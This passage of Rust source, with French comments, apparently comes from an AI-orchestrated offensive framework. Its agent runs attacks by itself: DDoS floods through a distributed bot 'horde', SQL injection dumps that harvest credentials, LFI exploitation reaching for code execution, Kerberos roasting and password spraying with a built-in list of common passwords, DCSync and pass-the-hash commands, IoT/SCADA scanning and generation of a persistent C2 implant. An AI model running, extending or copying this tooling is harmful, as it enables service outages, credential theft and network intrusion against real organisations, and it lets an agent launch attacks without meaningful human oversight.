        match run_goldeneye(&cfg, self.dashboard_emitter.clone()).await {
            Ok(stats) => {
                let hits = stats.hits();
                let fails = stats.fails();
                let waf = stats.waf_blocks.load(Ordering::Relaxed);
                let rps = (hits + fails) as f64 / duration as f64;

                let status = if fails as f64 / (hits + fails + 1) as f64 > 0.8 {
                    "SERVEUR PROBABLEMENT DOWN ✅"
                } else if waf > 10 {
                    "WAF DÉTECTÉ — requêtes bloquées"
                } else {
                    "serveur stable"
                };

                let summary = format!(
                    "Stress test terminé — hits={} fails={} waf={} rps={:.1} → {}",
                    hits, fails, waf, rps, status
                );
                println!("   \x1b[32m[STRESS]\x1b[0m {}", summary);
                self.memory.log(
                    "stress_test",
                    &action.technique,
                    Some(&target_url),
                    "complete",
                    &summary,
                    "ai_agent",
                );
                Ok(summary)
            }
            Err(e) => Err(anyhow!("Stress test échoué: {}", e)),
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_web_attack — l'agent IA pilote les attaques web avancées
    // ═════════════════════════════════════════════════════════════════════
    async fn action_web_attack(&mut self, action: &PlannedAction) -> Result<String> {
        use crate::web_attack::{exploit_lfi, WebAttackConfig, WebAuth};
        use crate::web_spider::sqli_extract as do_sqli_extract;

        let url = if action.target.starts_with("http") {
            action.target.clone()
        } else {
            format!("http://{}", action.target)
        };

        // ── Délégation au sous-agent spécialisé ──────────────────────────────
        // Crawl de surface (spider), empreinte, énumération des paramètres et
        // détection des vulnérabilités sont confiés à `WebAnalysisAgent` — l'agent
        // dédié à l'analyse web — au lieu d'être exécutés dans l'agent généraliste.
        // Il ne touche pas la mémoire : il rend un rapport typé, ingéré ici.
        let mut agent_cfg = WebAnalysisAgentConfig::default();
        if action.technique.to_lowercase().contains("smuggling") {
            agent_cfg.test_smuggling = true;
        }
        let agent = WebAnalysisAgent::new(agent_cfg);

        let brief = self.build_brief(AgentRole::Web, action, 600);
        println!(
            "   🌐 Brief WebAnalysisAgent — cible={} hypothèse={} ({} preuve(s) de surface)",
            brief.target,
            brief.hypothesis.as_deref().unwrap_or("-"),
            brief.surface_evidence.len()
        );

        let analysis = agent.run(&brief).await;
        println!("   ✓ {}", analysis.summary);

        let host_key = normalize_host_key(&url);
        self.ingest_agent_report(&host_key, &analysis);

        // Journalisation par vulnérabilité : l'orchestrateur transforme les
        // marqueurs `web_vuln` du rapport en entrées de chronologie de campagne.
        for f in &analysis.findings {
            if let Some(rest) = f.strip_prefix("web_vuln:") {
                let mut it = rest.splitn(4, ':');
                let sev = it.next().unwrap_or("");
                let vtype = it.next().unwrap_or("");
                let _prm = it.next().unwrap_or("");
                let ev = it.next().unwrap_or("");
                self.memory.log(
                    "web_attack",
                    vtype,
                    Some(&url),
                    "vuln",
                    &format!("[{}] {}", sev, ev),
                    "ai_agent",
                );
            }
        }

        let mut findings: Vec<String> = Vec::new();
        for e in &analysis.errors {
            findings.push(format!("erreur_analyse={}", e));
        }
        if !analysis.credentials.is_empty() {
            findings.push(format!(
                "{} secret(s) cloud extrait(s) via SSRF",
                analysis.credentials.len()
            ));
        }

        // ── EXPLOITATION SQLi ───────────────────────────────
        // L'orchestrateur ne fait plus que l'exploitation : les paramètres
        // candidats proviennent des marqueurs typés du rapport d'analyse.
        let sqli_params: Vec<(String, String)> = analysis
            .findings
            .iter()
            .filter_map(|f| f.strip_prefix("sqli_candidate:"))
            .filter_map(|rest| {
                rest.split_once(':')
                    .map(|(p, t)| (p.to_string(), t.to_string()))
            })
            .collect();

        // (table, ligne) brutes — promues en credentials après le dump.
        let mut sql_creds: Vec<(String, String)> = Vec::new();
        if !sqli_params.is_empty() {
            println!(
                "   ⚔️  Exploitation SQLi IA — {} paramètre(s) vulnérable(s)",
                sqli_params.len()
            );
            for (param, vuln_type) in &sqli_params {
                let technique = if vuln_type.contains("Union") {
                    "union"
                } else if vuln_type.contains("Blind") || vuln_type.contains("Boolean") {
                    "blind"
                } else if vuln_type.contains("Time") {
                    "blind"
                } else {
                    "error"
                };
                println!("     → param='{}' technique={}", param, technique);
                let extraction =
                    do_sqli_extract(&url, param, "GET", technique, &WebAuth::default(), &[]).await;
                let has_data = extraction.db_version.is_some()
                    || !extraction.databases.is_empty()
                    || !extraction.sample_data.is_empty();
                if !has_data {
                    for fallback in &["union", "error", "blind"] {
                        if fallback == &technique {
                            continue;
                        }
                        let fb =
                            do_sqli_extract(&url, param, "GET", fallback, &WebAuth::default(), &[])
                                .await;
                        if fb.db_version.is_some()
                            || !fb.databases.is_empty()
                            || !fb.sample_data.is_empty()
                        {
                            println!("     ✅ extraction OK fallback={}", fallback);
                            if let Some(ref ver) = fb.db_version {
                                findings.push(format!(
                                    "DB type={} ver={}",
                                    fb.db_type.as_deref().unwrap_or("?"),
                                    ver.chars().take(60).collect::<String>()
                                ));
                            }
                            for db in &fb.databases {
                                findings.push(format!("DB_SCHEMA {}", db));
                            }
                            for row in &fb.sample_data {
                                let table = row.first().map(|s| s.as_str()).unwrap_or("?");
                                let data = row.get(1).map(|s| s.as_str()).unwrap_or("");
                                findings.push(format!(
                                    "CREDS {}:{}",
                                    table,
                                    data.chars().take(120).collect::<String>()
                                ));
                                sql_creds.push((table.to_string(), data.to_string()));
                            }
                            break;
                        }
                    }
                } else {
                    if let Some(ref ver) = extraction.db_version {
                        findings.push(format!(
                            "SQLi type={} ver={}",
                            extraction.db_type.as_deref().unwrap_or("?"),
                            ver.chars().take(60).collect::<String>()
                        ));
                    }
                    for db in &extraction.databases {
                        findings.push(format!("DB_SCHEMA {}", db));
                    }
                    for row in &extraction.sample_data {
                        let table = row.first().map(|s| s.as_str()).unwrap_or("?");
                        let data = row.get(1).map(|s| s.as_str()).unwrap_or("");
                        findings.push(format!(
                            "CREDS {}:{}",
                            table,
                            data.chars().take(120).collect::<String>()
                        ));
                        sql_creds.push((table.to_string(), data.to_string()));
                    }
                }
            }

            // ── Chantier 3b — promotion des lignes « credential-like » ─────
            // Un dump arbitraire n'a pas de colonnes user/secret identifiables :
            // seules les tables dont le nom évoque des identifiants sont promues,
            // pour ne pas polluer la mémoire avec des données métier.
            let looks_like_credentials = |table: &str| {
                let t = table.to_lowercase();
                [
                    "user", "cred", "account", "admin", "pass", "login", "member",
                ]
                .iter()
                .any(|k| t.contains(k))
            };
            let mut promoted = 0usize;
            for (table, data) in &sql_creds {
                if data.is_empty() || !looks_like_credentials(table) {
                    continue;
                }
                self.memory.add_credential(Credential {
                    id: uuid::Uuid::new_v4().to_string(),
                    cred_type: CredentialType::Plaintext,
                    username: Some(table.clone()),
                    secret: data.clone(),
                    domain: None,
                    source_host: host_key.clone(),
                    service: "http-sqli".into(),
                    valid_on: Vec::new(),
                    harvested_at: chrono::Utc::now().to_rfc3339(),
                });
                promoted += 1;
            }
            if promoted > 0 {
                findings.push(format!(
                    "{} credential(s) dumpé(s) → mémoire campagne",
                    promoted
                ));
            }
        }

        // ── EXPLOITATION LFI / Path Traversal ────────────────
        let lfi_params: Vec<String> = analysis
            .findings
            .iter()
            .filter_map(|f| f.strip_prefix("lfi_candidate:"))
            .map(|s| s.to_string())
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect();
        if !lfi_params.is_empty() {
            let cfg = WebAttackConfig::default();
            let params: Vec<&str> = lfi_params.iter().map(|s| s.as_str()).collect();
            println!("   ⚔️  Exploitation LFI IA — wrappers php://filter / file:// / data:// / expect:// / php://input");
            let exploitations = exploit_lfi(&url, &params, &cfg).await;
            for ex in &exploitations {
                findings.push(format!(
                    "LFI param={} wrappers={} files={}",
                    ex.param,
                    ex.wrappers.join("/"),
                    ex.files_read.len()
                ));
                for (file, preview) in &ex.files_read {
                    findings.push(format!(
                        "LFI_READ {}:{}...",
                        file,
                        preview.chars().take(120).collect::<String>()
                    ));
                }
                for rce in &ex.rce_evidence {
                    findings.push(format!("LFI_RCE {}", rce));
                }
            }
        }

        if findings.is_empty() {
            Ok(format!(
                "Web attack {} — aucune vulnérabilité détectée",
                url
            ))
        } else {
            Ok(format!("Web attack {} — {}", url, findings.join(" | ")))
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_kerberos — attaques AD/Kerberos orchestrées par IA
    // ═════════════════════════════════════════════════════════════════════
    async fn action_kerberos(&mut self, action: &PlannedAction) -> Result<String> {
        use crate::ai::campaign_memory::Credential;
        use crate::kerberos::{
            asrep_roast_real, full_ad_attack, kerberoast_impacket, kerberos_spray, kerbrute_users,
            KerberosConfig,
        };

        let dc_ip = extract_host(&action.target);
        let tech = action.technique.to_lowercase();

        // Récupérer domaine/creds depuis la mémoire de campagne si disponibles
        let domain_from_memory = self
            .memory
            .hosts
            .values()
            .filter_map(|h| {
                h.notes
                    .iter()
                    .find(|n| n.starts_with("domain="))
                    .map(|n| n["domain=".len()..].to_string())
            })
            .next();

        let domain = domain_from_memory.unwrap_or_else(|| {
            action
                .target
                .splitn(2, '/')
                .next()
                .unwrap_or("corp.local")
                .to_string()
        });

        let (ad_user, ad_pass, ad_ntlm) = {
            let mut u = None;
            let mut p = None;
            let mut n = None;
            for c in &self.memory.credentials {
                if c.cred_type == crate::ai::campaign_memory::CredentialType::Plaintext {
                    if u.is_none() {
                        u = c.username.clone();
                        p = Some(c.secret.clone());
                    }
                } else if let crate::ai::campaign_memory::CredentialType::NtlmHash = c.cred_type {
                    n = Some(c.secret.clone());
                }
            }
            (u, p, n)
        };

        let cfg = KerberosConfig {
            dc_ip: dc_ip.clone(),
            domain: domain.clone(),
            username: ad_user.clone(),
            password: ad_pass.clone(),
            ntlm: ad_ntlm.clone(),
            timeout: 10,
            auto_install: self.config.auto_install,
            assume_yes: self.config.assume_yes,
        };

        println!("   🔐 Kerberos/AD IA sur DC={} domaine={}", dc_ip, domain);

        // Liste utilisateurs standards pour brute/enum
        let default_users = vec![
            "Administrator".to_string(),
            "admin".to_string(),
            "Guest".to_string(),
            "krbtgt".to_string(),
            "SQLService".to_string(),
            "WebService".to_string(),
            "Backup".to_string(),
            "PrintSvc".to_string(),
            "devadmin".to_string(),
            "svc_sql".to_string(),
            "svc_sharepoint".to_string(),
        ];

        let mut findings = Vec::new();

        // ── 1. AS-REP Roasting (sans auth nécessaire !) ────────────────
        if tech.contains("asrep") || tech.contains("as_rep") || tech.contains("full") {
            println!(
                "     → AS-REP Roasting wire protocol Kerberos ({} users)",
                default_users.len()
            );
            let hashes = asrep_roast_real(&cfg, &default_users).await;
            if !hashes.is_empty() {
                for h in &hashes {
                    let cred = Credential {
                        id: uuid::Uuid::new_v4().to_string(),
                        cred_type: crate::ai::campaign_memory::CredentialType::AsRepHash,
                        username: Some(h.username.clone()),
                        secret: h.hash.clone(),
                        domain: Some(h.domain.clone()),
                        source_host: dc_ip.clone(),
                        service: "kerberos/asrep".into(),
                        valid_on: vec![dc_ip.clone()],
                        harvested_at: chrono::Utc::now().to_rfc3339(),
                    };
                    self.memory.add_credential(cred);
                    findings.push(format!("AS-REP $krb5asrep$ user={}", h.username));
                }
                println!(
                    "     ⚠️  {} hash(es) AS-REP capturé(s) — crackable avec hashcat -m 18200",
                    hashes.len()
                );
            } else {
                findings.push("AS-REP: aucun compte vulnérable (pre-authentication)".into());
            }
        }

        // ── 2. Kerberoast SPN (requiert creds valides ou null) ─────────
        if tech.contains("kerberoast") || tech.contains("tgs") || tech.contains("full") {
            if cfg.username.is_some() && cfg.password.is_some() {
                println!("     → Kerberoasting impacket GetUserSPNs");
                let tgs = kerberoast_impacket(&cfg).await;
                if !tgs.is_empty() {
                    for t in &tgs {
                        findings.push(format!("KERBEROAST spn={} user={}", t.spn, t.username));
                    }
                    println!(
                        "     ⚠️  {} TGS capturé(s) — crackable hashcat -m 13100",
                        tgs.len()
                    );
                }
            } else {
                findings.push("KERBEROAST skipped (credentials valides requis)".into());
            }
        }

        // ── 3. Kerbrute — enumération utilisateurs valides ──────────────
        if tech.contains("kerbrute") || tech.contains("enum") || tech.contains("full") {
            println!(
                "     → Kerbrute users enumeration ({} tentatives)",
                default_users.len()
            );
            let (valid, disabled) = kerbrute_users(&cfg, &default_users).await;
            if !valid.is_empty() {
                findings.push(format!("USERS_VALID {}", valid.join(",")));
                if let Some(h) = self.memory.hosts.get_mut(&dc_ip) {
                    h.notes.push(format!("ad_users={}", valid.join(",")));
                    if !h.notes.iter().any(|n| n.starts_with("domain=")) {
                        h.notes.push(format!("domain={}", domain));
                    }
                }
            }
            if !disabled.is_empty() {
                findings.push(format!("USERS_DISABLED {}", disabled.join(",")));
            }
            println!(
                "     ✅ {} users valides, {} désactivés",
                valid.len(),
                disabled.len()
            );
        }

        // ── 4. Password Spraying Kerberos ───────────────────────────────
        if tech.contains("spray") || tech.contains("password_spray") {
            let common_pwds: Vec<String> = [
                "Password123!",
                "Winter2024!",
                "Summer2024!",
                "Welcome1",
                "Admin2024!",
                "Corp2024!",
            ]
            .iter()
            .take(3)
            .cloned()
            .map(String::from)
            .collect();
            println!(
                "     → Password Spraying Kerberos: {} passwords (delay 2s safe)",
                common_pwds.len()
            );
            let results = kerberos_spray(&cfg, &default_users, &common_pwds, 2000).await;
            for r in &results {
                if r.success {
                    findings.push(format!("SPRAY_OK {}:{}", r.username, r.password));
                    let cred = Credential {
                        id: uuid::Uuid::new_v4().to_string(),
                        cred_type: crate::ai::campaign_memory::CredentialType::Plaintext,
                        username: Some(r.username.clone()),
                        secret: r.password.clone(),
                        domain: Some(domain.clone()),
                        source_host: dc_ip.clone(),
                        service: "kerberos/spray".into(),
                        valid_on: vec![dc_ip.clone()],
                        harvested_at: chrono::Utc::now().to_rfc3339(),
                    };
                    self.memory.add_credential(cred);
                }
            }
        }

        // ── 5. Full AD Attack si demandé ou si creds disponibles ────────
        if tech.contains("full_ad") || tech.contains("dcsync") {
            if cfg.username.is_some() && cfg.password.is_some() {
                println!("     → Full AD Attack chain (AS-REP + Kerberoast + Enum)");
                let ad_report = full_ad_attack(&cfg, &default_users).await;
                findings.push(format!(
                    "AD_REPORT domain={} valid_users={} asrep={} tgs={}",
                    ad_report.domain,
                    ad_report.valid_users.len(),
                    ad_report.asrep_hashes.len(),
                    ad_report.tgs_hashes.len()
                ));
                for (tech, cmd) in &ad_report.attack_commands {
                    findings.push(format!(
                        "CMD_{}: {}",
                        tech,
                        cmd.chars().take(150).collect::<String>()
                    ));
                }
            }
        }

        if findings.is_empty() {
            Err(anyhow!("Kerberos attack {} sur {}: aucune technique reconnue (utilisez: asrep/kerberoast/kerbrute/spray/full)", action.technique, dc_ip))
        } else {
            Ok(format!(
                "Kerberos {}@{} — {}",
                dc_ip,
                domain,
                findings.join(" | ")
            ))
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_horde — Orchestrateur IA DDoS distribué HORDE
    // ═════════════════════════════════════════════════════════════════════
    async fn action_horde(&mut self, action: &PlannedAction) -> Result<String> {
        use std::sync::atomic::Ordering;

        let target = action.target.clone();
        let tech = action.technique.to_lowercase();

        println!(
            "   🧟 Orchestrateur HORDE DDoS IA — cible={} technique={}",
            target, tech
        );

        // Configuration safe depuis l'IA (limites OPSEC stricts)
        let duration = if self.config.stealth_mode {
            15u64
        } else {
            30u64
        };
        let total_bots = if self.config.stealth_mode {
            50usize
        } else {
            200usize
        };

        let mut findings = Vec::new();
        findings.push(format!(
            "HORDE_CONF bots={} duration={}s stealth={}",
            total_bots, duration, self.config.stealth_mode
        ));

        // Orchestrateur HORDE — utiliser les workers si connectés
        if let Some(coord) = &self.horde_coordinator {
            let connected_count = coord.connected_workers_count().await;
            if connected_count > 0 {
                println!(
                    "   🧟 HORDE: {} workers connectés. Lancement de la campagne DDoS...",
                    connected_count
                );

                let target_url = ensure_url_scheme(&target);

                // Démarrer la campagne via le coordinateur
                let attack_mode = if tech.contains("slowloris") {
                    AttackMode::Slowloris
                } else if tech.contains("rudy") {
                    AttackMode::Rudy
                } else if tech.contains("browser") {
                    AttackMode::BrowserFlood
                } else {
                    AttackMode::Flood
                };

                let goldeneye_template_cfg = crate::stress::goldeneye::GoldenEyeConfig {
                    url: target_url.clone(),
                    attack_mode: attack_mode,
                    // Ces valeurs seront surchargées par compute_assignments sur les workers
                    num_bots: 0,
                    max_concurrent_bots: 0,
                    duration_secs: Some(duration),
                    rotate_fingerprint_on_403: true,
                    send_client_hints: true,
                    send_sec_fetch: true,
                    debug: false,
                    ..Default::default()
                };

                coord
                    .start_campaign(target_url.clone(), attack_mode, &goldeneye_template_cfg)
                    .await;
                let _ = coord.compute_assignments(&goldeneye_template_cfg).await;
                let _ = coord.tx_events.send(crate::horde::HordeCoordMsg::Command {
                    kind: crate::horde::HordeCommandKind::Start,
                    factor: None,
                });

                self.memory.log(
                    "horde",
                    &action.technique,
                    Some(&target_url),
                    "running",
                    &format!(
                        "mode={} bots={} duration={}s (distribué)",
                        attack_mode.as_str(),
                        connected_count,
                        duration
                    ),
                    "ai_agent",
                );

                // Attendre la fin de la campagne (via le coordinateur qui va la stopper)
                // Ou implémenter une surveillance de l'état de la campagne ici
                // Pour l'instant, on va juste dire qu'elle est lancée.
                // TODO: surveiller le stop_flag du coordinateur pour un résultat plus précis
                return Ok(format!(
                    "Horde DDoS distribué lancé sur {} avec {} workers.",
                    target_url, connected_count
                ));
            }
        }

        // Fallback sur GoldenEye local si aucun worker connecté ou pas de coordinateur
        use crate::stress::goldeneye::{run_goldeneye, AttackMode, GoldenEyeConfig};
        let mode = if tech.contains("slowloris") {
            AttackMode::Slowloris
        } else if tech.contains("rudy") {
            AttackMode::Rudy
        } else if tech.contains("browser") {
            AttackMode::BrowserFlood
        } else {
            AttackMode::Flood
        };

        let target_url = ensure_url_scheme(&target);

        findings.push(format!(
            "GOLDENEYE_MODE {} sur {}",
            mode.as_str(),
            target_url
        ));

        let ge_cfg = GoldenEyeConfig {
            url: target_url.clone(),
            attack_mode: mode,
            num_bots: total_bots.min(200),
            max_concurrent_bots: if self.config.stealth_mode { 20 } else { 80 },
            duration_secs: Some(duration),
            rotate_fingerprint_on_403: true,
            send_client_hints: true,
            send_sec_fetch: true,
            debug: false,
            ..GoldenEyeConfig::default()
        };

        println!(
            "     🤖 Lancement GoldenEye HORDE-fallback pendant {}s ({} bots)",
            duration,
            total_bots.min(200)
        );
        self.memory.log(
            "horde",
            &action.technique,
            Some(&target_url),
            "running",
            &format!(
                "mode={} bots={} duration={}s",
                mode.as_str(),
                total_bots,
                duration
            ),
            "ai_agent",
        );

        match run_goldeneye(&ge_cfg, self.dashboard_emitter.clone()).await {
            Ok(stats) => {
                let hits = stats.hits();
                let fails = stats.fails();
                let waf = stats.waf_blocks.load(Ordering::Relaxed);
                let rps = (hits + fails) as f64 / duration as f64;
                let down_ratio = fails as f64 / (hits + fails + 1) as f64;
                let status = if down_ratio > 0.8 {
                    "SERVEUR_DOWN".to_string()
                } else if waf > 20 {
                    format!("WAF_DETECTE(bloque={})", waf)
                } else {
                    format!("STABLE(hits={} rps={:.0})", hits, rps)
                };
                findings.push(format!(
                    "HORDE_RESULT status={} hits={} fails={} waf={} rps={:.1}",
                    status, hits, fails, waf, rps
                ));
                self.memory.log(
                    "horde",
                    &action.technique,
                    Some(&target_url),
                    "complete",
                    &status,
                    "ai_agent",
                );
                Ok(format!("HORDE {} — {}", target_url, findings.join(" | ")))
            }
            Err(e) => {
                self.memory.log(
                    "horde",
                    &action.technique,
                    Some(&target_url),
                    "failure",
                    &e.to_string(),
                    "ai_agent",
                );
                Err(anyhow!("Horde attack échouée: {}", e))
            }
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_ad_attack — attaques Active Directory natives (crate::ad)
    // ═════════════════════════════════════════════════════════════════════
    async fn action_ad_attack(&mut self, action: &PlannedAction) -> Result<String> {
        let dc_ip = extract_host(&action.target);
        let domain = action
            .parameters
            .get("domain")
            .cloned()
            .unwrap_or_else(|| "lab.example".to_string());
        let technique = action.technique.to_lowercase();
        println!(
            "   🏛️  Attaque AD native sur {} (domaine {})...",
            dc_ip, domain
        );

        // 1. Reconnaissance LDAP (bind anonyme)
        let mut report = match crate::ad::ldap_anonymous_bind(&dc_ip, &domain, 389).await {
            Ok(r) => r,
            Err(e) => {
                println!("   ⚠️  LDAP anonyme indisponible : {}", e);
                crate::ad::AdReport {
                    domain: domain.clone(),
                    dc_ip: dc_ip.clone(),
                    ..Default::default()
                }
            }
        };

        // 2. Technique AD demandée
        let mut hash_count = 0usize;
        if technique.contains("asrep")
            || technique.contains("as-rep")
            || technique.contains("noauth")
        {
            let users: Vec<String> = action
                .parameters
                .get("users")
                .map(|s| {
                    s.split(',')
                        .map(|x| x.trim().to_string())
                        .filter(|x| !x.is_empty())
                        .collect()
                })
                .unwrap_or_else(|| report.users.iter().map(|u| u.username.clone()).collect());
            if users.is_empty() {
                println!("   ℹ️  Aucun utilisateur cible (paramètre 'users' requis)");
            } else {
                let roasted = crate::ad::asrep_roast(&dc_ip, &domain, &users).await;
                hash_count += roasted.len();
                report.asrep_roastable = roasted.iter().map(|h| h.username.clone()).collect();
                report.asrep_hashes = roasted;
            }
        } else if technique.contains("kerberoast") {
            let user = action.parameters.get("user").cloned().unwrap_or_default();
            let pass = action
                .parameters
                .get("password")
                .cloned()
                .unwrap_or_default();
            let spns: Vec<String> = action
                .parameters
                .get("spns")
                .map(|s| {
                    s.split(',')
                        .map(|x| x.trim().to_string())
                        .filter(|x| !x.is_empty())
                        .collect()
                })
                .unwrap_or_else(|| report.kerberoastable.clone());
            let khashes = crate::ad::kerberoast(
                &dc_ip,
                &domain,
                &user,
                &pass,
                &spns,
                self.config.auto_install,
                self.config.assume_yes,
            )
            .await;
            hash_count += khashes.len();
            report.kerberoast_hashes = khashes;
        }

        // 3. Chemins d'attaque dérivés
        let paths = crate::ad::analyze_attack_paths(&report);
        report.attack_paths.extend(paths);

        // 4. Commandes opérateur (DCSync / Pass-the-Hash)
        let mut cmds: Vec<String> = Vec::new();
        if technique.contains("dcsync") {
            let user = action.parameters.get("user").cloned().unwrap_or_default();
            let pass = action
                .parameters
                .get("password")
                .cloned()
                .unwrap_or_default();
            cmds.extend(crate::ad::dcsync_cmds(&domain, &user, &pass, &dc_ip));
        }
        if technique.contains("pth") || technique.contains("pass-the-hash") {
            let user = action.parameters.get("user").cloned().unwrap_or_default();
            let ntlm = action.parameters.get("ntlm").cloned().unwrap_or_default();
            cmds.extend(crate::ad::pass_the_hash_cmds(&domain, &user, &ntlm, &dc_ip));
        }

        // 5. Intégration à la mémoire de campagne
        let now = chrono::Utc::now().to_rfc3339();
        for c in &report.computers {
            let clean = c.split_whitespace().next().unwrap_or(c);
            if clean.parse::<std::net::IpAddr>().is_ok() {
                self.memory.add_host(clean, vec!["ad/computer".into()]);
            }
        }
        for h in &report.asrep_hashes {
            self.memory.add_credential(Credential {
                id: uuid::Uuid::new_v4().to_string(),
                cred_type: CredentialType::AsRepHash,
                username: Some(h.username.clone()),
                secret: h.hash.clone(),
                domain: Some(domain.clone()),
                source_host: dc_ip.clone(),
                service: "kerberos".into(),
                valid_on: vec![],
                harvested_at: now.clone(),
            });
        }
        for h in &report.kerberoast_hashes {
            self.memory.add_credential(Credential {
                id: uuid::Uuid::new_v4().to_string(),
                cred_type: CredentialType::KerberosTgsHash,
                username: Some(h.username.clone()),
                secret: h.hash.clone(),
                domain: Some(domain.clone()),
                source_host: dc_ip.clone(),
                service: "kerberos".into(),
                valid_on: vec![],
                harvested_at: now.clone(),
            });
        }
        if let Some(hm) = self.memory.hosts.get_mut(&dc_ip) {
            for p in &report.attack_paths {
                hm.notes.push(format!("ad_path:{}", p.risk));
            }
        }

        crate::ad::print_ad_report(&report);

        Ok(format!(
            "AD {} — {} utilisateur(s), {} ordinateur(s), {} hash(es), {} chemin(s) d'attaque{}",
            domain,
            report.users.len(),
            report.computers.len(),
            hash_count,
            report.attack_paths.len(),
            if cmds.is_empty() {
                String::new()
            } else {
                format!(" | {} commande(s) opérateur prêtes", cmds.len())
            }
        ))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_osint — reconnaissance OSINT externe (crate::osint)
    // ═════════════════════════════════════════════════════════════════════
    async fn action_osint(&mut self, action: &PlannedAction) -> Result<String> {
        let domain = crate::osint::normalize_domain(&action.target);
        println!("   🌐 OSINT externe sur {}...", domain);

        let keys = crate::osint::OsintApiKeys::from_env();
        let report = crate::osint::full_osint_recon_v2(
            &domain,
            &keys,
            self.dashboard_emitter.as_ref(),
            None,
        )
        .await;

        crate::osint::print_osint_report(&report);

        // Intégration : sous-domaines résolus + ports Shodan → hôtes de campagne
        let mut new_hosts = 0usize;
        for s in &report.subdomains {
            if let Some(ip) = &s.ip {
                if !self.memory.hosts.contains_key(ip) {
                    new_hosts += 1;
                }
                self.memory.add_host(ip, vec!["osint/subdomain".into()]);
            }
        }
        for s in &report.open_ports {
            if !s.ip.is_empty() {
                if !self.memory.hosts.contains_key(&s.ip) {
                    new_hosts += 1;
                }
                self.memory
                    .add_host(&s.ip, vec![format!("{}/{}", s.service, s.port)]);
            }
        }

        Ok(format!(
            "OSINT {} — {} sous-domaine(s), {} fuite(s) GitHub, {} actif(s) exposé(s), {} nouvel/nouveaux hôte(s){}",
            domain, report.subdomains.len(), report.github_leaks.len(), report.open_ports.len(), new_hosts,
            if report.intelligence.is_some() { " | analyse IA disponible" } else { "" }
        ))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_iot_scada — inventaire IoT / SCADA (crate::iot_scada)
    // ═════════════════════════════════════════════════════════════════════
    async fn action_iot_scada(&mut self, action: &PlannedAction) -> Result<String> {
        let host = extract_host(&action.target);
        println!("   🏭 Inventaire IoT/SCADA sur {}...", host);

        let hosts = vec![host.as_str()];
        let report = crate::iot_scada::full_iot_scan(&hosts).await;

        for (h, p, proto) in &report.open_ports {
            self.memory.add_host(h, vec![format!("{}/{}", proto, p)]);
        }
        for d in &report.devices {
            self.memory
                .add_host(&d.host, vec![format!("{}/{}", d.protocol, d.port)]);
            if let Some(hm) = self.memory.hosts.get_mut(&d.host) {
                if let Some(v) = &d.vendor {
                    hm.notes.push(format!("iot_vendor:{}", v));
                }
                if let Some(f) = &d.firmware {
                    hm.notes.push(format!("iot_firmware:{}", f));
                }
                for v in &d.vulns {
                    hm.notes
                        .push(format!("iot_vuln:{}:{}", v.vuln_type, v.severity));
                }
            }
        }

        let vulns: usize = report.devices.iter().map(|d| d.vulns.len()).sum();
        for d in &report.devices {
            println!(
                "   • {}:{} [{}] {} {} — {} vuln(s)",
                d.host,
                d.port,
                d.protocol,
                d.vendor.as_deref().unwrap_or("?"),
                d.model.as_deref().unwrap_or("?"),
                d.vulns.len()
            );
        }

        Ok(format!(
            "IoT/SCADA {} — {} appareil(s), {} port(s) ouvert(s), {} vulnérabilité(s)",
            host,
            report.devices.len(),
            report.open_ports.len(),
            vulns
        ))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_c2 — génération d'agent C2 / beacon (crate::c2::agent)
    // ═════════════════════════════════════════════════════════════════════
    async fn action_c2(&mut self, action: &PlannedAction) -> Result<String> {
        println!("   📡 Déploiement C2 / beacon...");

        let c2_url = action
            .parameters
            .get("c2_url")
            .cloned()
            .unwrap_or_else(|| "http://127.0.0.1:8080".to_string());
        let c2_ws_url = action
            .parameters
            .get("c2_ws_url")
            .cloned()
            .unwrap_or_else(|| "ws://127.0.0.1:8080/ws".to_string());
        let sleep_secs = action
            .parameters
            .get("sleep")
            .and_then(|s| s.parse().ok())
            .unwrap_or(60u64);
        let persist = action
            .parameters
            .get("persist")
            .map(|s| s == "true")
            .unwrap_or(false);

        let cfg = crate::c2::agent::ImplantConfig {
            c2_url: c2_url.clone(),
            c2_ws_url: c2_ws_url.clone(),
            sleep_secs,
            jitter: 0.3,
            persist,
            kill_date: action.parameters.get("kill_date").cloned(),
            decoys: crate::c2::agent::resolve_decoy_urls(),
        };

        let implant = crate::c2::agent::generate_python_implant(&cfg);

        std::fs::create_dir_all(&self.config.save_dir).ok();
        let implant_path = format!(
            "{}/implant_{}.py",
            self.config.save_dir, self.config.session_id
        );
        std::fs::write(&implant_path, &implant)?;

        // Métadonnées du beacon (paramètres opérationnels)
        let meta_path = format!(
            "{}/c2_beacon_{}.json",
            self.config.save_dir, self.config.session_id
        );
        let meta = serde_json::json!({
            "c2_url":     c2_url,
            "c2_ws_url":  c2_ws_url,
            "sleep_secs": sleep_secs,
            "persist":    persist,
            "decoys":     cfg.decoys.len(),
            "implant":    implant_path,
        });
        std::fs::write(&meta_path, serde_json::to_string_pretty(&meta)?)?;

        Ok(format!(
            "Beacon généré : {} (C2={}, sleep={}s, persist={}, decoys={})",
            implant_path,
            cfg.c2_url,
            sleep_secs,
            persist,
            cfg.decoys.len()
        ))
    }

    // ═════════════════════════════════════════════════════════════════════
    // action_integration — outils tiers (crate::integrations)
    // ═════════════════════════════════════════════════════════════════════
    async fn action_integration(&mut self, action: &PlannedAction) -> Result<String> {
        let technique = action.technique.to_lowercase();
        println!("   🔌 Intégration outil tiers : {}...", action.technique);

        let mut mgr = crate::integrations::IntegrationManager::new();
        let mut status: Vec<String> = Vec::new();

        // Paramètres MSF : action.parameters > config.msf (env) > défauts.
        let cfg_msf = self.config.msf.clone();
        let use_msf = technique.contains("metasploit")
            || technique.contains("msf")
            || action.parameters.contains_key("msf_host")
            || cfg_msf.is_some();
        let use_bh = technique.contains("bloodhound") || action.parameters.contains_key("bh_url");

        if use_msf {
            let host = action
                .parameters
                .get("msf_host")
                .cloned()
                .or_else(|| cfg_msf.as_ref().map(|c| c.host.clone()))
                .unwrap_or_else(|| "127.0.0.1".to_string());
            let port = action
                .parameters
                .get("msf_port")
                .and_then(|s| s.parse().ok())
                .or_else(|| cfg_msf.as_ref().map(|c| c.port))
                .unwrap_or(55553u16);
            let user = action
                .parameters
                .get("msf_user")
                .cloned()
